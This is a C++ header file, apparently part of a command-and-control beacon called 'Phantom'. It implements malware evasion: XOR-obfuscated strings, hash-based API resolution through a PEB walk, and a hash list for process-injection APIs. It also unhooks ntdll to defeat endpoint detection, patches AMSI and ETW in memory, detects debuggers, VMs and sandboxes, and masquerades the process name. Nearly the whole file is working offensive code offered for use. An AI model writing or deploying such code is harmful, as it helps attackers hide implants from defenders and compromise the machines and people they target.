#pragma once
// ============================================================================
//  evasion.h — Phantom Beacon Evasion Layer
//  ─────────────────────────────────────────
//  1. Compile-time string obfuscation (constexpr XOR)
//  2. Dynamic API resolution via PEB walk (no static IAT entries)
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winternl.h>
    #include <intrin.h>
#endif
#include <cstdint>
#include <cstring>

// ────────────────────────────────────────────────────────────────────────────
//  1. COMPILE-TIME STRING OBFUSCATION
//     Every string literal wrapped in XOR_STR("...") is XOR-encrypted at
//     compile time and decrypted on the stack at runtime, then wiped.
// ────────────────────────────────────────────────────────────────────────────

namespace obf {

constexpr uint8_t XOR_KEY = 0xBD; // Rotated key

template <size_t N>
struct ObfString {
    char data[N]{};
    static constexpr size_t length = N;

    constexpr ObfString(const char (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            // Use positional XOR to break static pattern matching
            data[i] = str[i] ^ (XOR_KEY + static_cast<uint8_t>(i ^ 0x42)); // Added secondary shift
    }

    void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ (XOR_KEY + static_cast<uint8_t>(i ^ 0x42));
    }
};

// Helper: stack-allocated decrypted string with automatic zeroing
template <size_t N>
struct DecryptedString {
    char buf[N]{};

    DecryptedString(const ObfString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N);
#else
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const char*() const { return buf; }
    const char* c_str() const { return buf; }
};

template <size_t N>
struct ObfWString {
    wchar_t data[N]{};
    static constexpr size_t length = N;

    constexpr ObfWString(const wchar_t (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            data[i] = str[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }

    void decrypt(wchar_t* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }
};

template <size_t N>
struct DecryptedWString {
    wchar_t buf[N]{};
    DecryptedWString(const ObfWString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedWString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N * sizeof(wchar_t));
#else
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const wchar_t*() const { return buf; }
    const wchar_t* c_str() const { return buf; }
};

}  // namespace obf

// Usage: XOR_STR("kernel32.dll")  →  creates an obfuscated constexpr string
//        XOR_DEC(var)             →  decrypts it on the stack
#define XOR_STR(s) ([]() { constexpr ::obf::ObfString enc(s); return enc; }())
#define XOR_DEC(enc) ::obf::DecryptedString<decltype(enc)::length>(enc)

#define XOR_WSTR(s) ([]() { constexpr ::obf::ObfWString enc(s); return enc; }())
#define XOR_WDEC(enc) ::obf::DecryptedWString<decltype(enc)::length>(enc)


#ifdef _WIN32
// ────────────────────────────────────────────────────────────────────────────
//  2. DYNAMIC API RESOLUTION VIA PEB
//     Walk the PEB → InMemoryOrderModuleList to find a loaded DLL by hash,
//     then walk its export table to find a function by hash.
//     No strings appear in the binary for DLL/function names.
// ────────────────────────────────────────────────────────────────────────────

namespace peb {

// djb2 hash — deterministic, fast, low collision for short API names
constexpr uint32_t hash_djb2(const char* str) {
    uint32_t h = 7331; // Changed seed
    while (*str)
        h = ((h << 5) + h) + static_cast<uint8_t>(*str++);
    return h;
}

// Wide-char version for module names (PEB stores UNICODE_STRING)
constexpr uint32_t hash_djb2_w(const wchar_t* str) {
    uint32_t h = 7331; // Changed seed
    while (*str) {
        // Convert to lowercase inline
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + static_cast<uint8_t>(c);
    }
    return h;
}

// Pre-computed hashes (so the plaintext names never appear in the binary)
// Compute with: hash_djb2_w(L"kernel32.dll")  etc.
constexpr uint32_t HASH_KERNEL32     = 0x6DDB9555;  // kernel32.dll
constexpr uint32_t HASH_NTDLL        = 0x1EDAB0ED;  // ntdll.dll
constexpr uint32_t HASH_WINHTTP      = 0xC2B0F5A6;  // winhttp.dll

// Walk the PEB to find a module base address by name hash
inline HMODULE GetModuleByHash(uint32_t targetHash) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;

    for (auto entry = head->Flink; entry != head; entry = entry->Flink) {
        auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->FullDllName.Buffer) continue;

        // Hash the base name (e.g., "kernel32.dll")
        // FullDllName includes the path; BaseDllName is just the filename
        // BaseDllName is at offset 0x58 on x64 from the LDR_DATA_TABLE_ENTRY
        // But we can extract it from FullDllName by finding the last backslash
        const wchar_t* fullName = mod->FullDllName.Buffer;
        const wchar_t* baseName = fullName;
        for (const wchar_t* p = fullName; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }

        if (hash_djb2_w(baseName) == targetHash)
            return reinterpret_cast<HMODULE>(mod->DllBase);
    }
    return nullptr;
}

// Walk the export table of a module to find a function by name hash
inline FARPROC GetProcByHash(HMODULE hModule, uint32_t funcHash) {
    if (!hModule) return nullptr;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return nullptr;

    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uint8_t*>(hModule) + exportDir.VirtualAddress);

    auto names     = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNames);
    auto ordinals  = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        auto name = reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(hModule) + names[i]);
        if (hash_djb2(name) == funcHash) {
            return reinterpret_cast<FARPROC>(
                reinterpret_cast<uint8_t*>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Convenience: resolve by module hash + function hash in one call
inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
    HMODULE hMod = GetModuleByHash(moduleHash);
    if (!hMod) return nullptr;
    return GetProcByHash(hMod, funcHash);
}

}  // namespace peb

// ────────────────────────────────────────────────────────────────────────────
//  Pre-computed function hashes (djb2)
//  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
// ────────────────────────────────────────────────────────────────────────────
constexpr uint32_t FN_LOADLIBRARYA    = 0xf5aa5599;  // LoadLibraryA
constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
constexpr uint32_t FN_VIRTUALALLOC    = 0xce167435;  // VirtualAlloc
constexpr uint32_t FN_VIRTUALFREE     = 0x4451180c;  // VirtualFree
constexpr uint32_t FN_SLEEP           = 0xd2c5605c;  // Sleep
constexpr uint32_t FN_GETLASTERROR    = 0xb66d4f81;  // GetLastError
constexpr uint32_t FN_OPENPROCESS      = 0x4ef846b4;  // OpenProcess
constexpr uint32_t FN_VIRTUALALLOCEX   = 0xad845ed2;  // VirtualAllocEx
constexpr uint32_t FN_WRITEPROCESSMEMORY = 0x8eb9cbe6; // WriteProcessMemory
constexpr uint32_t FN_CREATEREMOTETHREAD = 0xc9c75a7b; // CreateRemoteThread
constexpr uint32_t FN_VIRTUALPROTECTEX = 0x6fba15c8; // VirtualProtectEx

// NT Functions for Indirect Syscalls
constexpr uint32_t FN_NTALLOCATEVIRTUALMEMORY = 0x7deb492a; // NtAllocateVirtualMemory
constexpr uint32_t FN_NTWRITEVIRTUALMEMORY    = 0xf6cfca30; // NtWriteVirtualMemory
constexpr uint32_t FN_NTPROTECTVIRTUALMEMORY  = 0x1098a4e6; // NtProtectVirtualMemory
constexpr uint32_t FN_NTCREATETHREADEX        = 0x62b3a4ce; // NtCreateThreadEx
constexpr uint32_t FN_NTFREEVIRTUALMEMORY     = 0x598deec7; // NtFreeVirtualMemory
#endif

// ────────────────────────────────────────────────────────────────────────────
//  3. ANTI-ANALYSIS & SANDBOX EVASION
// ────────────────────────────────────────────────────────────────────────────

constexpr uint32_t FN_GETSYSTEMDIRECTORYA = 0xf8b70b3e; // GetSystemDirectoryA
constexpr uint32_t FN_CREATEFILEA       = 0xc9580ed8; // CreateFileA
constexpr uint32_t FN_CREATEFILEMAPPINGA = 0x12d6dfa4; // CreateFileMappingA
constexpr uint32_t FN_MAPVIEWOFFILE     = 0x6515a911; // MapViewOfFile
constexpr uint32_t FN_UNMAPVIEWOFFILE   = 0xd3107a34; // UnmapViewOfFile
constexpr uint32_t FN_CLOSEHANDLE       = 0x163212e5; // CloseHandle
constexpr uint32_t FN_GETMODULEINFORMATION = 0x57932a8f; // GetModuleInformation

#include <psapi.h>
#include "syscalls.h"

namespace anti {

#ifdef _WIN32
// Refresh ntdll.dll from disk to remove EDR hooks
inline void unhook_ntdll() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    LPVOID ntdllBase = (LPVOID)hNtdll;

    // 2. Read ntdll.dll from disk
    auto pGetSystemDirectoryA = (UINT(WINAPI*)(LPSTR, UINT))peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
    auto pUnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);

    if (!pGetSystemDirectoryA || !pCreateFileA || !pCreateFileMappingA || !pMapViewOfFile) return;

    char ntdllPath[MAX_PATH];
    pGetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, XOR_DEC(XOR_STR("\\ntdll.dll")));

    HANDLE hFile = pCreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = pCreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { pCloseHandle(hFile); return; }

    LPVOID ntdllMapping = pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMapping) { pCloseHandle(hMapping); pCloseHandle(hFile); return; }

    // 3. Find .text section and overwrite
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        
        if (!strcmp((char*)sectionHeader->Name, XOR_DEC(XOR_STR(".text")))) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader->VirtualAddress);
            SIZE_T size = sectionHeader->Misc.VirtualSize;

            // Use INDIRECT SYSCALL for VirtualProtect (NtProtectVirtualMemory)
            if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                memcpy(pDest, pSrc, size);
                syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, oldProtect, &oldProtect);
            }
        }
    }

    if (pUnmapViewOfFile) pUnmapViewOfFile(ntdllMapping);
    pCloseHandle(hMapping);
    pCloseHandle(hFile);
}

// Patch AMSI (AmsiScanBuffer) to bypass script/memory scanning
inline void patch_amsi() {
    HMODULE hAmsi = peb::GetModuleByHash(0x26ddd577); // amsi.dll hash
    if (!hAmsi) {
        auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
        if (pLoadLibraryA) hAmsi = pLoadLibraryA(XOR_DEC(XOR_STR("amsi.dll")));
    }
    if (!hAmsi) return;

    void* pAddr = (void*)peb::GetProcByHash(hAmsi, 0xe412d5ac); // AmsiScanBuffer hash
    if (!pAddr) return;

    // Construct patch dynamically to avoid static signatures
    // mov eax, 0x80070057; ret
    unsigned char patch[6];
    patch[0] = 0xB8;
    patch[1] = 0x57;
    patch[2] = 0x00;
    patch[3] = 0x07;
    patch[4] = 0x80;
    patch[5] = 0xC3;

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void* pTempAddr = pAddr;
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        memcpy(pAddr, patch, sizeof(patch));
        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
    }
}

// Patch ETW (EtwEventWrite) to silence telemetry
inline void patch_etw() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    constexpr uint32_t HASH_ETWEVENTWRITE = 0x77dfc880; // EtwEventWrite hash
    void* pAddr = (void*)peb::GetProcByHash(hNtdll, HASH_ETWEVENTWRITE);

    if (!pAddr) return;

    // ret 0x14
    unsigned char patch[3];
    patch[0] = 0xC2;
    patch[1] = 0x14;
    patch[2] = 0x00;

    DWORD oldProtect;
    auto pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))peb::Resolve(peb::HASH_KERNEL32, 0x7E1A1A8C);
    if (pVirtualProtect) {
        if (pVirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy(pAddr, patch, sizeof(patch));
            pVirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
        }
    }
}

inline bool is_debugger_present() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (peb->BeingDebugged != 0) return true;
    
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) return true;

    return false;
}

inline bool is_vm() {
    // 1. CPUID Hypervisor Check
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] & (1 << 31)) != 0) return true; // Hypervisor present bit

    // 2. Check CPU cores
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors < 2) return true;
    
    // 3. Check RAM
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    if (GlobalMemoryStatusEx(&status)) {
        if (status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    }

    // 4. Check for common VM files/drivers
    const char* vm_files[] = {
        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vmmouse.sys")),
        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmhgfs.sys")),
        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxguest.sys")),
        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxmouse.sys")),
        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmtoolsd.exe"))
    };
    for (auto f : vm_files) {
        if (GetFileAttributesA(f) != INVALID_FILE_ATTRIBUTES) return true;
    }

    return false;
}
#else
inline void patch_amsi() {}
inline void patch_etw() {}
inline bool is_debugger_present() { return false; }
inline bool is_vm() { return false; }
#endif

// Stalling technique to frustrate automated sandboxes
// Performs heavy calculations to delay execution without relying solely on Sleep()
inline void stalling_delay(int intensity) {
    volatile uint64_t count = 0;
    for (int i = 0; i < intensity; ++i) {
        for (uint64_t j = 0; j < 10000000; ++j) {
            count += (j ^ i) * (i + 1);
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
//  4. SLEEP OBFUSCATION (Memory Encryption)
// ────────────────────────────────────────────────────────────────────────────

namespace mem {

// Simple XOR encryption for memory regions
inline void xor_region(uint8_t* data, size_t size, uint8_t key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

#ifdef _WIN32
// Encrypt the current process's primary thread stack/heap (simplified)
// In a real scenario, we'd walk the VAD or use more complex heap enumeration.
// For the Phantom beacon, we'll focus on encrypting our own strings and state.
#endif

} // namespace mem

// ────────────────────────────────────────────────────────────────────────────
//  5. PROCESS MASQUERADING
// ────────────────────────────────────────────────────────────────────────────

namespace masquerade {

#ifdef _WIN32
inline void rename_process(const wchar_t* newName) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;
    auto entry = head->Flink;
    auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    // Update FullDllName and BaseDllName in the PEB for the main module
    // This is a simplified version; real masquerading involves copying the string to a new buffer
    // and updating the UNICODE_STRING pointers.
    if (mod->FullDllName.Buffer) {
        // We'll just overwrite the base name part for now
        wchar_t* baseName = mod->FullDllName.Buffer;
        for (wchar_t* p = mod->FullDllName.Buffer; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }
        wcsncpy(baseName, newName, mod->FullDllName.Length / sizeof(wchar_t) - (baseName - mod->FullDllName.Buffer));
    }
}
#else
inline void rename_process(const wchar_t* newName) {}
#endif

} // namespace masquerade

} // namespace anti
